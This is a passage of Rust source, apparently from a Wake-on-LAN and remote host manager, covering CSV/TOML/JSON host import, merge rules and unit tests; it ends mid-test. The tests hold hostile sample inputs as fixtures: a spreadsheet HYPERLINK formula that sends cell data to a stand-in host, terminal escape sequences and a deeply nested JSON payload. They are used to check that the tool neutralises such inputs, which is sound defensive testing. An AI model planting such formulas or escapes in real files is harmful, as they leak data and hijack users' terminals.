    let kind = get("remote_kind");
    let kind = kind.trim();
    if kind.is_empty() {
        let used: Vec<&str> = CSV_REMOTE_COLUMNS
            .iter()
            .copied()
            .filter(|c| !get(c).trim().is_empty())
            .collect();
        return Ok((!used.is_empty()).then(|| {
            format!(
                "remote_kind is empty (not managed): {} ignored",
                used.join(", ")
            )
        }));
    }
    remote.kind = Some(
        kind.parse::<RemoteKind>()
            .map_err(|e| format!("invalid remote_kind {kind:?}: {e}"))?,
    );
    remote.user = get("remote_user");
    remote.address = get("remote_address");
    remote.port = get("ssh_port");
    remote.key_file = get("ssh_key_file");
    remote.host_key = get("ssh_host_key");
    let sudo = get("ssh_sudo");
    if !sudo.trim().is_empty() {
        remote.sudo = sudo
            .parse::<SudoMode>()
            .map_err(|e| format!("invalid ssh_sudo {sudo:?}: {e}"))?;
    }
    Ok(None)
}

fn parse_csv(bytes: &[u8], path: Option<&Path>) -> Result<ImportData> {
    let (text, fallback) = decode_csv_text(bytes);
    let mut warnings = Vec::new();
    if fallback {
        warnings.push("the CSV file is not UTF-8; it was read as Shift_JIS".to_owned());
    }
    let mut rdr = csv::ReaderBuilder::new()
        .flexible(true)
        .trim(csv::Trim::None)
        .delimiter(csv_delimiter(&text, path))
        .from_reader(text.as_bytes());
    let headers = rdr
        .headers()
        .map_err(|e| Error::Import {
            location: Some("row 1".into()),
            message: e.to_string(),
        })?
        .clone();
    let mut cols: Vec<Option<&'static str>> = headers.iter().map(csv_column).collect();
    if !cols.contains(&Some("name")) || !cols.contains(&Some("mac")) {
        return Err(Error::Import {
            location: Some("row 1".into()),
            message: "the header row needs at least `name` and `mac` columns".into(),
        });
    }
    // The remote columns mean something only together with the kind.
    let has_kind = cols.contains(&Some("remote_kind"));
    for (h, c) in headers.iter().zip(cols.iter_mut()) {
        if !has_kind && c.is_some_and(|c| CSV_REMOTE_COLUMNS.contains(&c)) {
            warnings.push(format!(
                "column {h:?} ignored: it needs a remote_kind column"
            ));
            *c = None;
        } else if c.is_none() && !h.trim().is_empty() {
            warnings.push(format!("unknown column {h:?} ignored"));
        }
    }
    let present: Vec<&'static str> = cols
        .iter()
        .flatten()
        .copied()
        .filter(|c| *c != "id")
        .collect();
    let empty = Config::default();
    let mut records = Vec::new();
    for (i, row) in rdr.records().enumerate() {
        let location = format!("row {}", i + 2);
        let row = match row {
            Ok(r) => r,
            Err(e) => {
                records.push(ImportRecord {
                    location,
                    host: Err(RecordError::Malformed {
                        message: e.to_string(),
                    }),
                    had_id: false,
                    present: present.clone(),
                });
                continue;
            }
        };
        if row.iter().all(|c| c.trim().is_empty()) {
            continue;
        }
        let get = |name: &str| -> String {
            let cell = cols
                .iter()
                .position(|c| *c == Some(name))
                .and_then(|i| row.get(i))
                .unwrap_or("");
            csv_unguard(cell).to_owned()
        };
        let mut draft = HostDraft {
            name: get("name"),
            mac: get("mac"),
            address: get("address"),
            group: get("group"),
            notes: get("notes"),
            port: get("port"),
            secureon: get("secureon"),
            targets: get("targets"),
            tcp_ports: get("tcp_ports"),
            ..HostDraft::default()
        };
        let mut malformed: Option<String> = None;
        let bcast = get("broadcast");
        match parse_bool_cell(&bcast) {
            Some(b) => draft.broadcast = b,
            None if bcast.trim().is_empty() => {}
            None => malformed = Some(format!("invalid broadcast value {bcast:?} (true / false)")),
        }
        let probe = get("probe");
        if !probe.trim().is_empty() {
            match probe.parse::<ProbeMethod>() {
                Ok(p) => draft.probe = Some(p),
                Err(e) => malformed = Some(format!("invalid probe {probe:?}: {e}")),
            }
        }
        draft.interfaces = get("interfaces")
            .split([';', '\n', '\r'])
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_owned)
            .collect();
        if has_kind {
            match remote_draft_from_csv(&get, &mut draft.remote) {
                Ok(None) => {}
                Ok(Some(w)) => warnings.push(format!("{location}: {w}")),
                Err(message) => malformed = Some(message),
            }
        }
        let id_text = get("id");
        let id = Uuid::parse_str(id_text.trim()).ok().filter(|u| !u.is_nil());
        let host = match (draft.build(&empty, None), malformed) {
            (Err(errs), _) => Err(RecordError::Fields {
                name: (!draft.name.trim().is_empty()).then(|| draft.name.clone()),
                errors: errs,
            }),
            (Ok(_), Some(message)) => Err(RecordError::Malformed { message }),
            (Ok(mut h), None) => {
                if let Some(id) = id {
                    h.id = id;
                }
                Ok(h)
            }
        };
        records.push(ImportRecord {
            location,
            host,
            had_id: id.is_some(),
            present: present.clone(),
        });
    }
    Ok(ImportData {
        format: Format::Csv,
        records,
        settings: None,
        warnings,
    })
}

/// Parses import data. Errors: [`Error::ConfigParse`] (TOML / JSON syntax, with line),
/// [`Error::Import`] (wrong structure or CSV header). Individual bad records do not fail
/// here; they are reported per record.
pub fn parse_import(
    bytes: &[u8],
    format: Option<Format>,
    path: Option<&Path>,
) -> Result<ImportData> {
    let fmt = Format::detect(bytes, format, path);
    match fmt {
        Format::Csv => parse_csv(bytes, path),
        Format::Toml | Format::Json => {
            let b = strip_bom(bytes);
            let text = std::str::from_utf8(b).map_err(|_| Error::Import {
                location: None,
                message: "the file is not valid UTF-8".into(),
            })?;
            if fmt == Format::Toml {
                parse_toml(text, path)
            } else {
                parse_json(text, path)
            }
        }
    }
}

fn find_match(hosts: &[Host], incoming: &Host, had_id: bool) -> Option<usize> {
    if had_id && let Some(i) = hosts.iter().position(|h| h.id == incoming.id) {
        return Some(i);
    }
    let key = normalize::name_key(&incoming.name);
    hosts
        .iter()
        .position(|h| normalize::name_key(&h.name) == key)
}

/// Applies parsed data to `cfg`. Atomic: on error `cfg` is unchanged.
///
/// Errors: [`Error::Import`] for the first invalid record unless `skip_invalid`.
pub fn apply_import(
    cfg: &mut Config,
    data: &ImportData,
    opts: &ImportOptions,
) -> Result<ImportSummary> {
    let mut summary = ImportSummary {
        warnings: data.warnings.clone(),
        ..ImportSummary::default()
    };
    let mut work = cfg.clone();
    if opts.include_settings
        && let Some(s) = &data.settings
    {
        if work.settings != *s {
            work.settings = s.clone();
        }
        summary.settings_replaced = true;
    }
    let original = cfg.hosts.clone();
    let mut result: Vec<Host> = match opts.mode {
        ImportMode::Merge => original.clone(),
        ImportMode::Replace => Vec::new(),
    };
    let mut matched_original: Vec<bool> = vec![false; original.len()];

    let skip = |loc: &str, err: RecordError, summary: &mut ImportSummary| -> Result<()> {
        if opts.skip_invalid {
            summary.skipped.push(ImportSkip {
                location: loc.to_owned(),
                error: err,
            });
            Ok(())
        } else {
            Err(Error::Import {
                location: Some(loc.to_owned()),
                message: err.to_string(),
            })
        }
    };

    for rec in &data.records {
        let incoming = match &rec.host {
            Ok(h) => h,
            Err(e) => {
                skip(&rec.location, e.clone(), &mut summary)?;
                continue;
            }
        };
        let orig_idx = find_match(&original, incoming, rec.had_id);
        let mut host = match orig_idx {
            Some(i) => overlay(&original[i], incoming, &rec.present),
            None => incoming.clone(),
        };
        let (key_merge, target_changed, commands_kept) = match orig_idx {
            Some(i) => {
                let kept = keep_local_host_key(&original[i], &mut host);
                let commands = keep_local_commands(&original[i], &mut host);
                let changed = original[i].remote.is_some()
                    && host.remote.is_some()
                    && !crate::secret::same_target(&original[i], &host);
                (kept, changed, commands)
            }
            None => (HostKeyMerge::Unchanged, false, false),
        };
        if orig_idx.is_none()
            && (host.id.is_nil()
                || !rec.had_id
                || original.iter().any(|h| h.id == host.id)
                || result.iter().any(|h| h.id == host.id))
        {
            host.id = Uuid::new_v4();
        }
        // Where does it go in `result`, and is the name free?
        let slot = result.iter().position(|h| h.id == host.id);
        let key = normalize::name_key(&host.name);
        let clash = result
            .iter()
            .enumerate()
            .any(|(j, h)| Some(j) != slot && normalize::name_key(&h.name) == key);
        let already_imported = orig_idx.is_some_and(|i| matched_original[i]);
        if clash || already_imported {
            skip(
                &rec.location,
                RecordError::Fields {
                    name: Some(host.name.clone()),
                    errors: vec![FieldError::new(Field::Name, FieldIssue::DuplicateName)],
                },
                &mut summary,
            )?;
            continue;
        }
        if let Some(i) = orig_idx {
            matched_original[i] = true;
        }
        match key_merge {
            HostKeyMerge::KeptLocal => summary.host_keys_kept.push(host.name.clone()),
            HostKeyMerge::Cleared => summary.host_keys_cleared.push(host.name.clone()),
            HostKeyMerge::Unchanged => {}
        }
        if target_changed {
            summary.remote_changed.push(host.name.clone());
        }
        if commands_kept {
            summary.commands_kept.push(host.name.clone());
        }
        if orig_idx.is_none() && has_custom_commands(&host) {
            summary.commands_imported.push(host.name.clone());
        }
        match (slot, orig_idx) {
            (Some(j), Some(i)) => {
                if original[i] == host {
                    summary.unchanged.push(host.name.clone());
                } else {
                    summary.updated.push(host.name.clone());
                }
                result[j] = host;
            }
            (None, Some(i)) => {
                if original[i] == host {
                    summary.unchanged.push(host.name.clone());
                } else {
                    summary.updated.push(host.name.clone());
                }
                result.push(host);
            }
            (_, None) => {
                summary.added.push(host.name.clone());
                result.push(host);
            }
        }
    }
    if opts.mode == ImportMode::Replace {
        summary.removed = original
            .iter()
            .zip(&matched_original)
            .filter(|(_, m)| !**m)
            .map(|(h, _)| h.name.clone())
            .collect();
    }
    work.hosts = result;
    *cfg = work;
    Ok(summary)
}

/// [`parse_import`] + [`apply_import`].
pub fn import(
    cfg: &mut Config,
    bytes: &[u8],
    path: Option<&Path>,
    opts: &ImportOptions,
) -> Result<ImportSummary> {
    let data = parse_import(bytes, opts.format, path)?;
    apply_import(cfg, &data, opts)
}

/// Dry run: what [`import`] would do, without changing `cfg`.
pub fn preview(
    cfg: &Config,
    bytes: &[u8],
    path: Option<&Path>,
    opts: &ImportOptions,
) -> Result<ImportSummary> {
    let mut c = cfg.clone();
    import(&mut c, bytes, path, opts)
}

/// Ids of the hosts that an import would add or update, for UIs that want to highlight
/// them (computed on a clone).
pub fn affected_ids(before: &Config, after: &Config) -> Vec<HostId> {
    after
        .hosts
        .iter()
        .filter(|h| before.get(h.id) != Some(*h))
        .map(|h| h.id)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg() -> Config {
        Config::from_toml(
            r#"
[settings.wake]
repeat = 5

[[hosts]]
id = "5f0c6a1e-3b7d-4f5e-9a51-2d6c1f0e8b44"
name = "NAS"
mac = "00:11:22:33:44:55"
address = "192.168.1.10"
group = "Home"
notes = "書斎の NAS"
future = "kept"

[[hosts]]
id = "9d7e2b10-8c4f-4a36-b1e2-6f3a0c5d7e91"
name = "Lab-PC"
mac = "AA:BB:CC:DD:EE:FF"
targets = ["10.0.20.255", "relay.lan:9"]
interfaces = ["Ethernet 2"]
tcp_ports = [3389, 22]
probe = "tcp"
broadcast = false
"#,
        )
        .unwrap()
        .0
    }

    #[test]
    fn round_trip_all_formats() {
        let c = cfg();
        for format in [Format::Toml, Format::Json, Format::Csv] {
            let bytes = export(
                &c,
                &ExportOptions {
                    format,
                    include_settings: true,
                },
            )
            .unwrap();
            assert_eq!(Format::detect(&bytes, None, None), format, "{format}");
            let mut empty = Config::default();
            let s = import(&mut empty, &bytes, None, &ImportOptions::default()).unwrap();
            assert_eq!(s.added.len(), 2, "{format}");
            for (a, b) in empty.hosts.iter().zip(&c.hosts) {
                assert_eq!(a.id, b.id, "{format}");
                assert_eq!(a.name, b.name);
                assert_eq!(a.mac, b.mac);
                assert_eq!(a.targets, b.targets);
                assert_eq!(a.interfaces, b.interfaces);
                assert_eq!(a.tcp_ports, b.tcp_ports);
                assert_eq!(a.broadcast, b.broadcast);
                assert_eq!(a.probe, b.probe);
                if format != Format::Csv {
                    assert_eq!(a, b, "{format}");
                }
            }
        }
    }

    #[test]
    fn csv_has_bom_and_header() {
        let bytes = export(
            &cfg(),
            &ExportOptions {
                format: Format::Csv,
                include_settings: false,
            },
        )
        .unwrap();
        assert!(bytes.starts_with(b"\xEF\xBB\xBFid,name,mac,"));
        let text = String::from_utf8(bytes).unwrap();
        assert!(text.contains("10.0.20.255;relay.lan:9"));
        assert!(text.contains("\r\n"));
    }

    #[test]
    fn toml_export_without_settings() {
        let text = String::from_utf8(
            export(
                &cfg(),
                &ExportOptions {
                    format: Format::Toml,
                    include_settings: false,
                },
            )
            .unwrap(),
        )
        .unwrap();
        assert!(!text.contains("[settings"));
        assert!(text.contains("future = \"kept\""));
    }

    /// `.tsv` (and tab-separated text without commas in the header) uses the tab delimiter.
    #[test]
    fn tab_separated_import() {
        let tsv = b"name\tmac\tgroup\nNAS\t02:00:00:00:00:01\tHome, Office\n";
        for (path, format) in [
            (Some("hosts.tsv"), None),
            (Some("HOSTS.TSV"), None),
            (Some("hosts.txt"), None),
            (None, None),
            (None, Some(Format::Csv)),
        ] {
            let data = parse_import(tsv, format, path.map(Path::new)).unwrap();
            assert_eq!(data.format, Format::Csv);
            assert_eq!(data.records.len(), 1, "{path:?}");
            let h = data.records[0].host.as_ref().unwrap();
            assert_eq!(h.name, "NAS");
            assert_eq!(h.group.as_deref(), Some("Home, Office"));
        }
        // Japanese headers, Shift_JIS, tabs.
        let text = "名前\tMAC アドレス\r\nサーバー\t00:11:22:33:44:66\r\n";
        let (sjis, _, _) = encoding_rs::SHIFT_JIS.encode(text);
        let data = parse_import(&sjis, None, Some(Path::new("hosts.tsv"))).unwrap();
        assert_eq!(data.records[0].host.as_ref().unwrap().name, "サーバー");
        // Comma CSV is unaffected, also with tabs inside a cell.
        let csv = b"name,mac,notes\nNAS,02:00:00:00:00:01,a\tb\n";
        let data = parse_import(csv, None, Some(Path::new("hosts.csv"))).unwrap();
        let h = data.records[0].host.as_ref().unwrap();
        assert_eq!(h.notes.as_deref(), Some("a\tb"));
    }

    #[test]
    fn shift_jis_csv() {
        let text = "name,mac,group\r\nサーバー,00:11:22:33:44:66,書斎\r\n";
        let (sjis, _, _) = encoding_rs::SHIFT_JIS.encode(text);
        assert!(std::str::from_utf8(&sjis).is_err());
        let data = parse_import(&sjis, Some(Format::Csv), None).unwrap();
        assert_eq!(data.warnings.len(), 1);
        let h = data.records[0].host.as_ref().unwrap();
        assert_eq!(h.name, "サーバー");
        assert_eq!(h.group.as_deref(), Some("書斎"));
    }

    #[test]
    fn japanese_headers_and_utf8_bom() {
        let text =
            "\u{FEFF}名前,MAC アドレス,IP アドレス,メモ\nPC1,00-11-22-33-44-77,192.168.1.20,机\n";
        let data = parse_import(text.as_bytes(), None, Some(Path::new("hosts.csv"))).unwrap();
        let h = data.records[0].host.as_ref().unwrap();
        assert_eq!(h.name, "PC1");
        assert_eq!(h.address.as_ref().unwrap().to_string(), "192.168.1.20");
        assert_eq!(h.notes.as_deref(), Some("机"));
    }

    #[test]
    fn merge_matches_by_id_then_name() {
        let mut c = cfg();
        let csv = "id,name,mac,notes\n\
                   5f0c6a1e-3b7d-4f5e-9a51-2d6c1f0e8b44,NAS-renamed,00:11:22:33:44:55,new\n\
                   ,lab-pc,AA:BB:CC:DD:EE:FF,\n\
                   ,Desk,02:00:00:00:00:01,\n";
        let s = import(&mut c, csv.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert_eq!(s.updated, vec!["NAS-renamed", "lab-pc"]);
        assert_eq!(s.added, vec!["Desk"]);
        assert_eq!(c.hosts.len(), 3);
        let nas = c
            .get("5f0c6a1e-3b7d-4f5e-9a51-2d6c1f0e8b44".parse().unwrap())
            .unwrap();
        assert_eq!(nas.name, "NAS-renamed");
        assert_eq!(
            nas.extra.get("future").and_then(|v| v.as_str()),
            Some("kept")
        );
        let lab = c.find("lab-pc").unwrap();
        assert_eq!(lab.id.to_string(), "9d7e2b10-8c4f-4a36-b1e2-6f3a0c5d7e91");
        // Columns missing from the CSV are kept.
        assert_eq!(lab.targets.len(), 2);
        assert_eq!(lab.tcp_ports, vec![3389, 22]);
        assert_eq!(lab.interfaces, vec!["Ethernet 2"]);
        assert!(!lab.broadcast);
        assert_eq!(nas.address.as_ref().unwrap().to_string(), "192.168.1.10");
    }

    #[test]
    fn toml_partial_host_updates_only_given_keys() {
        let mut c = cfg();
        let toml = "[[hosts]]\nname = \"Lab-PC\"\nmac = \"AA:BB:CC:DD:EE:FF\"\nnotes = \"moved\"\n";
        let s = import(&mut c, toml.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert_eq!(s.updated, vec!["Lab-PC"]);
        let lab = c.find("Lab-PC").unwrap();
        assert_eq!(lab.notes.as_deref(), Some("moved"));
        assert_eq!(lab.targets.len(), 2);
        assert_eq!(lab.probe, Some(ProbeMethod::Tcp));
        // Importing the same thing again is a no-op.
        let s = import(&mut c, toml.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert_eq!(s.unchanged, vec!["Lab-PC"]);
    }

    #[test]
    fn replace_mode_removes_others() {
        let mut c = cfg();
        let csv = "name,mac\nNAS,00:11:22:33:44:55\n";
        let s = import(
            &mut c,
            csv.as_bytes(),
            None,
            &ImportOptions {
                mode: ImportMode::Replace,
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(s.removed, vec!["Lab-PC"]);
        assert_eq!(c.hosts.len(), 1);
        assert_eq!(
            c.hosts[0].id.to_string(),
            "5f0c6a1e-3b7d-4f5e-9a51-2d6c1f0e8b44"
        );
    }

    #[test]
    fn invalid_rows_fail_or_skip() {
        let csv = "name,mac\nGood,02:00:00:00:00:02\nBad,zz\nGood,02:00:00:00:00:03\n";
        let mut c = cfg();
        let before = c.clone();
        let e = import(&mut c, csv.as_bytes(), None, &ImportOptions::default()).unwrap_err();
        assert!(matches!(e, Error::Import { .. }), "{e:?}");
        assert_eq!(c, before, "atomic");
        let s = import(
            &mut c,
            csv.as_bytes(),
            None,
            &ImportOptions {
                skip_invalid: true,
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(s.added, vec!["Good"]);
        assert_eq!(s.skipped.len(), 2, "bad MAC and duplicate name");
        assert_eq!(s.skipped[0].location, "row 3");
    }

    #[test]
    fn preview_does_not_change() {
        let c = cfg();
        let json = r#"{"hosts":[{"name":"New","mac":"02:00:00:00:00:05"}],"settings":{"wake":{"repeat":2}}}"#;
        let s = preview(
            &c,
            json.as_bytes(),
            None,
            &ImportOptions {
                include_settings: true,
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(s.added, vec!["New"]);
        assert!(s.settings_replaced);
        assert_eq!(c, cfg());
        let mut c2 = c.clone();
        import(
            &mut c2,
            json.as_bytes(),
            None,
            &ImportOptions {
                include_settings: true,
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(c2.settings.wake.repeat, 2);
        assert_eq!(affected_ids(&c, &c2).len(), 1);
    }

    #[test]
    fn json_array_and_errors() {
        let data =
            parse_import(br#"[{"name":"A","mac":"02:00:00:00:00:07"}]"#, None, None).unwrap();
        assert_eq!(data.format, Format::Json);
        assert!(data.records[0].host.is_ok());
        let e = parse_import(b"{\"hosts\": [", Some(Format::Json), None).unwrap_err();
        assert!(matches!(e, Error::ConfigParse { .. }));
        let e = parse_import(b"x = [", Some(Format::Toml), None).unwrap_err();
        assert!(matches!(e, Error::ConfigParse { line: Some(1), .. }));
        let e = parse_import(b"a,b\n1,2\n", Some(Format::Csv), None).unwrap_err();
        assert!(matches!(e, Error::Import { .. }));
    }

    /// A 258-byte JSON file used to make config.toml unreadable (the TOML parser gives up
    /// at a depth JSON allows).
    #[test]
    fn deeply_nested_unknown_keys_are_refused() {
        let deep = |n: usize| {
            format!(
                r#"{{"hosts":[{{"name":"d","mac":"00:11:22:33:44:dd","deep":{}1{}}}],"settings":{{"x":{}1{}}}}}"#,
                "[".repeat(n),
                "]".repeat(n),
                "[".repeat(n),
                "]".repeat(n)
            )
        };
        let data = parse_import(deep(100).as_bytes(), None, None).unwrap();
        assert!(matches!(
            data.records[0].host,
            Err(RecordError::Malformed { .. })
        ));
        assert!(data.settings.is_none());
        assert!(
            data.warnings.iter().any(|w| w.contains("nested")),
            "{:?}",
            data.warnings
        );
        let mut c = cfg();
        assert!(
            import(
                &mut c,
                deep(100).as_bytes(),
                None,
                &ImportOptions::default()
            )
            .is_err()
        );
        // Shallow unknown keys are still carried along and stay readable.
        let data = parse_import(deep(5).as_bytes(), None, None).unwrap();
        let h = data.records[0].host.clone().unwrap();
        assert!(h.extra.contains_key("deep"));
        let mut c = Config::default();
        c.hosts.push(h);
        Config::from_toml(&c.to_toml().unwrap()).unwrap();
    }

    #[test]
    fn imported_names_groups_and_notes_lose_control_characters() {
        let json = "{\"hosts\":[{\"name\":\"evil\\u001b]0;PWNED\\u0007\",\"mac\":\"02:00:00:00:00:31\",\
            \"group\":\"g\\u001b[31m\",\"notes\":\"n\\u001b[31mote\\r\\nline 2\"}]}";
        let data = parse_import(json.as_bytes(), None, None).unwrap();
        let h = data.records[0].host.clone().unwrap();
        assert_eq!(h.name, "evil ]0;PWNED");
        assert_eq!(h.group.as_deref(), Some("g [31m"));
        assert_eq!(h.notes.as_deref(), Some("n[31mote\nline 2"));
        let csv = "name,mac,notes\nX,02:00:00:00:00:32,\"a\u{1b}[2Jb\"\n";
        let data = parse_import(csv.as_bytes(), None, None).unwrap();
        let h = data.records[0].host.clone().unwrap();
        assert_eq!(h.notes.as_deref(), Some("a[2Jb"));
    }

    #[test]
    fn csv_export_neutralizes_formulas_and_import_restores_them() {
        let mut c = Config::default();
        for (i, (name, group, notes)) in [
            (
                "=1+1",
                "@SUM(A1)",
                "=HYPERLINK(\"http://example.invalid/?\"&A2,\"x\")",
            ),
            ("-server", "+g", "'=already quoted"),
            ("plain", "Home", "a = b"),
        ]
        .into_iter()
        .enumerate()
        {
            let mac = format!("02:00:00:00:00:4{i}").parse().unwrap();
            let mut h = Host::new(name, mac);
            h.group = Some(group.into());
            h.notes = Some(notes.into());
            c.hosts.push(h);
        }
        let bytes = export(
            &c,
            &ExportOptions {
                format: Format::Csv,
                include_settings: false,
            },
        )
        .unwrap();
        let text = String::from_utf8(bytes.clone()).unwrap();
        for cell in [
            "'=1+1",
            "'@SUM(A1)",
            "\"'=HYPERLINK(",
            "'-server",
            "'+g",
            "''=already quoted",
            ",plain,",
            ",a = b,",
        ] {
            assert!(text.contains(cell), "{cell}: {text}");
        }
        let mut back = Config::default();
        import(&mut back, &bytes, None, &ImportOptions::default()).unwrap();
        for (a, b) in back.hosts.iter().zip(&c.hosts) {
            assert_eq!(a.name, b.name);
            assert_eq!(a.group, b.group);
            assert_eq!(a.notes, b.notes);
        }
    }

    #[test]
    fn imports_refuse_too_many_ports_and_multicast_macs() {
        let ports: Vec<String> = (20000..20017).map(|p| p.to_string()).collect();
        let json = format!(
            r#"{{"hosts":[{{"name":"many","mac":"02:00:00:00:00:51","tcp_ports":[{}]}},{{"name":"mc","mac":"11:22:33:44:55:66"}}]}}"#,
            ports.join(",")
        );
        let data = parse_import(json.as_bytes(), None, None).unwrap();
        let issues = |i: usize| match &data.records[i].host {
            Err(RecordError::Fields { errors, .. }) => {
                errors.iter().map(|e| e.issue).collect::<Vec<_>>()
            }
            other => panic!("{other:?}"),
        };
        assert_eq!(issues(0), vec![FieldIssue::TooManyPorts]);
        assert_eq!(issues(1), vec![FieldIssue::MacNotUnicast]);
    }

    // ---- v0.2.0: remote management ------------------------------------------------------------

    const ED25519: &str =
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl";

    fn remote_cfg() -> Config {
        let mut c = cfg();
        let mut w = crate::model::RemoteConfig::new(RemoteKind::Windows);
        w.user = Some(r"NAS\admin".into());
        w.address = Some("100.105.1.2".parse().unwrap());
        c.hosts[0].remote = Some(w);
        let mut s = crate::model::RemoteConfig::new(RemoteKind::Ssh);
        s.user = Some("pi".into());
        s.port = Some(2222);
        s.key_file = Some(r"C:\Users\me\.ssh\id_ed25519".into());
        s.host_key = Some(ED25519.into());
        s.sudo = SudoMode::NoPasswd;
        s.reboot_command = Some("/sbin/reboot".into());
        s.extra.insert("future".into(), toml::Value::Boolean(true));
        c.hosts[1].remote = Some(s);
        c
    }

    fn export_as(c: &Config, format: Format) -> Vec<u8> {
        export(
            c,
            &ExportOptions {
                format,
                include_settings: true,
            },
        )
        .unwrap()
    }

    #[test]
    fn remote_fields_round_trip_without_secrets() {
        let c = remote_cfg();
        // Secrets exist only in the (here: in-memory) Credential Manager, never in exports.
        use crate::secret::{MemoryBackend, SecretBackend, SecretKind, SecretStore};
        let backend = std::sync::Arc::new(MemoryBackend::new());
        let secrets = SecretStore::with_backend(backend.clone(), crate::secret::TARGET_PREFIX);
        for h in &c.hosts {
            backend
                .write(
                    &secrets.target(h.id, SecretKind::Login),
                    "u",
                    "Sup3r-Secret!",
                )
                .unwrap();
        }
        secrets
            .set_for_host(&c.hosts[0], SecretKind::Login, "", "Sup3r-Secret!")
            .unwrap();
        for format in [Format::Toml, Format::Json, Format::Csv] {
            let bytes = export_as(&c, format);
            let text = String::from_utf8_lossy(&bytes);
            assert!(!text.contains("Sup3r-Secret!"), "{format}");
            assert!(
                !text.to_lowercase().contains("password"),
                "{format}: {text}"
            );
            assert!(text.contains(ED25519), "{format}: host key exported");
            let mut empty = Config::default();
            import(&mut empty, &bytes, None, &ImportOptions::default()).unwrap();
            let (w, s) = (
                empty.hosts[0].remote.clone().unwrap(),
                empty.hosts[1].remote.clone().unwrap(),
            );
            assert_eq!(w.kind, RemoteKind::Windows);
            assert_eq!(w.user.as_deref(), Some(r"NAS\admin"));
            assert_eq!(
                w.address.map(|a| a.to_string()).as_deref(),
                Some("100.105.1.2")
            );
            assert_eq!(s.kind, RemoteKind::Ssh);
            assert_eq!(s.port, Some(2222));
            assert_eq!(s.sudo, SudoMode::NoPasswd);
            assert_eq!(s.host_key.as_deref(), Some(ED25519));
            assert_eq!(
                s.key_file.as_deref(),
                Some(std::path::Path::new(r"C:\Users\me\.ssh\id_ed25519"))
            );
            if format == Format::Csv {
                // CSV has no columns for the command overrides / unknown keys.
                assert_eq!(s.reboot_command, None);
            } else {
                assert_eq!(empty.hosts, c.hosts, "{format}");
            }
        }
    }

    #[test]
    fn csv_remote_columns() {
        let text = String::from_utf8(export_as(&remote_cfg(), Format::Csv)).unwrap();
        let header = text.trim_start_matches('\u{FEFF}').lines().next().unwrap();
        assert_eq!(header, CSV_COLUMNS.join(","));
        assert!(header.ends_with(
            "remote_kind,remote_user,remote_address,ssh_port,ssh_key_file,ssh_sudo,ssh_host_key"
        ));
        let rows: Vec<&str> = text.lines().skip(1).collect();
        // Review m10: `ssh_sudo` only for SSH rows.
        assert!(
            rows[0].ends_with(r",windows,NAS\admin,100.105.1.2,,,,"),
            "{}",
            rows[0]
        );
        assert!(rows[1].contains(",ssh,pi,,2222,"), "{}", rows[1]);
        assert!(rows[1].contains(",nopasswd,ssh-ed25519 "), "{}", rows[1]);
        // Unmanaged hosts have empty remote cells (no sudo either).
        let plain = String::from_utf8(export_as(&cfg(), Format::Csv)).unwrap();
        assert!(plain.lines().nth(1).unwrap().ends_with(",,,,,,,"));
    }

    #[test]
    fn csv_remote_import_rules() {
        let head = "name,mac,remote_kind,remote_user,ssh_port,ssh_sudo,sudo_extra\r\n";
        // Aliases and validation.
        let data = parse_import(
            format!(
                "{head}a,02:00:00:00:00:01,linux,pi,22,separate,\r\nb,02:00:00:00:00:02,,,,,\r\nc,02:00:00:00:00:03,,pi,,,\r\nd,02:00:00:00:00:04,ipmi,,,,\r\ne,02:00:00:00:00:05,ssh,a b,0,,\r\nf,02:00:00:00:00:06,ssh,,,doas,\r\n"
            )
            .as_bytes(),
            Some(Format::Csv),
            None,
        )
        .unwrap();
        let r = &data.records;
        let a = r[0].host.as_ref().unwrap().remote.clone().unwrap();
        assert_eq!(
            (a.kind, a.user.as_deref(), a.port, a.sudo),
            (RemoteKind::Ssh, Some("pi"), Some(22), SudoMode::Separate)
        );
        assert!(r[1].host.as_ref().unwrap().remote.is_none());
        // Review m10: an empty kind means "not managed"; leftover cells are only a warning.
        assert!(r[2].host.as_ref().unwrap().remote.is_none());
        assert!(
            data.warnings
                .iter()
                .any(|w| w.starts_with("row 4:") && w.contains("remote_user")),
            "{:?}",
            data.warnings
        );
        for (i, needle) in [(3, "ipmi"), (5, "doas")] {
            match &r[i].host {
                Err(RecordError::Malformed { message }) => {
                    assert!(message.contains(needle), "{message}")
                }
                other => panic!("row {i}: {other:?}"),
            }
        }
        match &r[4].host {
            Err(RecordError::Fields { errors, .. }) => assert_eq!(
                errors.iter().map(|e| e.field).collect::<Vec<_>>(),
                vec![Field::RemoteUser, Field::SshPort]
            ),
            other => panic!("{other:?}"),
        }
        assert!(data.warnings.iter().any(|w| w.contains("sudo_extra")));
    }

    #[test]
    fn csv_remote_overlay_on_existing_hosts() {
        let mut c = remote_cfg();
        // Without a remote_kind column the remote tables are untouched.
        let s = import(
            &mut c,
            "name,mac,notes\r\nLab-PC,AA:BB:CC:DD:EE:FF,x\r\n".as_bytes(),
            None,
            &ImportOptions {
                format: Some(Format::Csv),
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(s.updated, vec!["Lab-PC"]);
        let lab = c.hosts[1].remote.clone().unwrap();
        assert_eq!(lab.host_key.as_deref(), Some(ED25519));
        // With remote_kind: present columns overwrite, others (key file, commands, unknown
        // keys) are kept; an empty kind removes the table. The pinned host key of the same
        // server (kind, address, port unchanged) stays (review M2).
        let s = import(
            &mut c,
            "name,mac,remote_kind,remote_user,ssh_host_key\r\nLab-PC,AA:BB:CC:DD:EE:FF,ssh,root,\r\nNAS,00:11:22:33:44:55,,,\r\n"
                .as_bytes(),
            None,
            &ImportOptions {
                format: Some(Format::Csv),
                ..ImportOptions::default()
            },
        )
        .unwrap();
        let lab = c.hosts[1].remote.clone().unwrap();
        assert_eq!(lab.user.as_deref(), Some("root"));
        assert_eq!(lab.host_key.as_deref(), Some(ED25519));
        assert!(s.host_keys_kept.is_empty(), "the file had no key");
